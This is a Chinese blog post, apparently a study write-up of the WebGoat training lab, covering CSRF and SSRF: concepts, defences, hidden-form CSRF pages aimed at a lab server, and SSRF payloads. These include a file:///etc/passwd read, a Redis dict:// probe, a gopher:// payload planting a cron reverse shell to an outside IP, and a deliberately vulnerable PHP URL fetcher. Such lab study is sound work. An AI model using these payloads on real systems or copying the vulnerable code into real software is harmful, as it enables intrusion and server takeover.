@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="CSRF基础知识 与XSS区别从信任的角度来区分XSS:利用用户对站点的信任 CSRF:利用站点对已经身份认证的信任 攻击原理在客户端与服务端（如果服务端没有对请求进行二次验证）建立合法请求之后，攻击者通过各种方法向受害者发送一个链接，受害者点击链接后，在受害者非自愿的情况下向服务端发送了指令（诸如修改密码之类的），之后，攻击者就可以通过受害者的账号和攻击者自己设置的新密码登录服务端。 CSRF是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webgoat-CSRF_SSRF">
+<meta property="og:url" content="http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/index.html">
+<meta property="og:site_name" content="Tansz">
+<meta property="og:description" content="CSRF基础知识 与XSS区别从信任的角度来区分XSS:利用用户对站点的信任 CSRF:利用站点对已经身份认证的信任 攻击原理在客户端与服务端（如果服务端没有对请求进行二次验证）建立合法请求之后，攻击者通过各种方法向受害者发送一个链接，受害者点击链接后，在受害者非自愿的情况下向服务端发送了指令（诸如修改密码之类的），之后，攻击者就可以通过受害者的账号和攻击者自己设置的新密码登录服务端。 CSRF是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200721201606796.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200721201617981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020072120164037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200721213402668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20200721213624615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70">
+<meta property="article:published_time" content="2020-08-21T03:01:40.789Z">
+<meta property="article:modified_time" content="2020-08-21T03:01:42.604Z">
+<meta property="article:author" content="Tansz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20200721201606796.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Webgoat-CSRF_SSRF</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/08/21/webgoat-%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/08/21/Webgoat%20-%20xss/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&text=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&is_video=false&description=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Webgoat-CSRF_SSRF&body=Check out this article: http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&name=Webgoat-CSRF_SSRF&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&t=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">1.2.</span> <span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识-1"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解-1"><span class="toc-number">2.2.</span> <span class="toc-text">题解</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Webgoat-CSRF_SSRF
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Tansz</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-08-21T03:01:40.789Z" itemprop="datePublished">2020-08-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><ul>
+<li>与XSS区别<br>从信任的角度来区分<pre><code>XSS:利用用户对站点的信任
+CSRF:利用站点对已经身份认证的信任</code></pre></li>
+<li>攻击原理<br>在客户端与服务端（如果服务端没有对请求进行二次验证）建立合法请求之后，攻击者通过各种方法向受害者发送一个链接，受害者点击链接后，在受害者非自愿的情况下向服务端发送了指令（诸如修改密码之类的），之后，攻击者就可以通过受害者的账号和攻击者自己设置的新密码登录服务端。</li>
+<li>CSRF是一种业务逻辑漏洞<br>对关键操作缺少确认机制<br>自动扫描程序无法发现此类漏洞</li>
+<li>漏洞利用条件<br>被害用户己经完成身份认证<br>新请求的提交不需要重新身份认证或确认机制<br>攻击者必须了解Web APP请求的参数构造<br>诱使用户触发攻击的指令(社工)</li>
+<li>防御手段<br>Captcha (验证码验证)<br>anti-CSRF token：（ 在服务器端生成随机token，浏览器在发起针对数据的修改请求将token提交，由服务器端验证通过够进行操作逻辑，token需要至多一次有效，并具有有限的生命周期<br>a. 表单提交修改数据- 可将token生成在表单内使用input:hidden标签进行提交<br>b. Ajax提交修改数据-可将token生成在cookie内(cookie不能设置为httponly)，ajax请求前通过js读取cookie中的token并添加到request body或者http requestheader中进行提交<br>   ）<pre><code>referrer头检验</code></pre>  降低会话时间<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2></li>
+<li>0x03<br>构造钓鱼页面发给受害者，诱使受害者（在于服务端建立连接之后）点击<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/basic-get-flag" method="POST"&gt;</span><br><span class="line">		&lt;input type="hidden" name="csrf" value="false" /&gt;</span><br><span class="line">		&lt;input type="hidden" name="submit" value="%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2"/ &gt;</span><br><span class="line">		&lt;input type="submit" value="click"/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<img src="https://img-blog.csdnimg.cn/20200721201606796.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200721201617981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2020072120164037.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>0x04</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/review" method="POST"&gt;</span><br><span class="line">		&lt;input type="hidden" name="reviewText" value="a" /&gt;</span><br><span class="line">		&lt;input type="hidden" name="stars" value="1"/ &gt;  </span><br><span class="line">		&lt;input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"/ &gt;</span><br><span class="line">		&lt;input type="submit" value="click"/&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>0x07</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="selector-tag">html</span>&gt;</span><br><span class="line">	&lt;<span class="selector-tag">body</span>&gt;</span><br><span class="line">	&lt;form action="http://192.168.80.2:8080/WebGoat/csrf/feedback/message" method="POST" enctype="text/plain" &gt; </span><br><span class="line">		&lt;input type="hidden" name='&#123;"name": "pasa","email":"passsaa@wobwolf.com","subject":"service","message":"' value='aaa"&#125;'&gt;</span><br><span class="line">	&lt;/form&gt;</span><br><span class="line">	&lt;<span class="selector-tag">script</span>&gt;</span><br><span class="line">	      <span class="selector-tag">document</span><span class="selector-class">.forms</span><span class="selector-attr">[0]</span><span class="selector-class">.submit</span>();</span><br><span class="line">	&lt;/script&gt;</span><br><span class="line">	&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><a href="https://www.secpulse.com/archives/61297.html" target="_blank" rel="noopener">JSON CSRF</a></p>
+</blockquote>
+<ul>
+<li>0x08<br>创建一个已csrf–当前用户名的新帐号即可</li>
+</ul>
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h2><p>由攻击者构造的攻击链接传给服务端执行造成的漏洞，一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p>
+<ul>
+<li>SSRF的危害<br>内外网的端口和服务扫描<br>向内部任意主机的任意端口发送精心构造的Payload<br>DOS攻击（请求大文件，始终保持连接Keep-Alive Always）<br>攻击内网的web应用，主要是使用GET参数就可以实现的攻击（比如struts2，sqli等）<br>利用file协议读取本地文件等<br>内外网主机应用程序漏洞的利用<br>内外网Web站点漏洞的利用</li>
+<li>SSRF漏洞的寻找<br>1）分享：通过URL地址分享网页内容<br>2）转码服务<br>3）在线翻译<br>4）图片加载与下载：通过URL地址加载或下载图片<br>5）图片、文章收藏功能<br>6）未公开的api实现以及其他调用URL的功能<br>7）从URL关键字中寻找</li>
+<li>SSRF漏洞的验证方法：<br>1）因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过<strong>抓包分析发送的请求是否是由服务器的发送的</strong>，从而来判断是否存在SSRF漏洞<br>2）在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=（地址）的就可能存在SSRF漏洞</a></li>
+<li>漏洞利用<br>1.本地利用</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dict protocol (操作Redis)</span></span><br><span class="line">curl -vvv <span class="string">'dict://127.0.0.1:6379/info'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># file protocol (任意文件读取)</span></span><br><span class="line">curl -vvv <span class="string">'file:///etc/passwd'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gopher protocol (一键反弹Bash)</span></span><br><span class="line"><span class="comment"># * 注意: 链接使用单引号，避免$变量问题</span></span><br><span class="line">curl -vvv <span class="string">'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a'</span></span><br></pre></td></tr></table></figure>
+<p>2.远程利用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">                $ch = curl_init();</span><br><span class="line">                curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">                curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">                curl_exec($ch);</span><br><span class="line">                curl_close($ch); </span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>防御方法<br>限制协议为HTTP、HTTPS<br>不用限制302重定向<br>设置URL白名单或者限制内网IP</li>
+</ul>
+<blockquote>
+<p><a href="https://www.jianshu.com/p/86bb349baac1" target="_blank" rel="noopener">SSRF</a></p>
+</blockquote>
+<h2 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h2><ul>
+<li>0x02<br><img src="https://img-blog.csdnimg.cn/20200721213402668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+<li>0x02<br><img src="https://img-blog.csdnimg.cn/20200721213624615.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hlZV9tZWU=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-number">1.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解"><span class="toc-number">1.2.</span> <span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">2.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识-1"><span class="toc-number">2.1.</span> <span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题解-1"><span class="toc-number">2.2.</span> <span class="toc-text">题解</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&text=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&is_video=false&description=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Webgoat-CSRF_SSRF&body=Check out this article: http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&title=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&name=Webgoat-CSRF_SSRF&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2020/08/21/Webgoat-CSRF_SSRF/&t=Webgoat-CSRF_SSRF" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2020
+    Tansz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
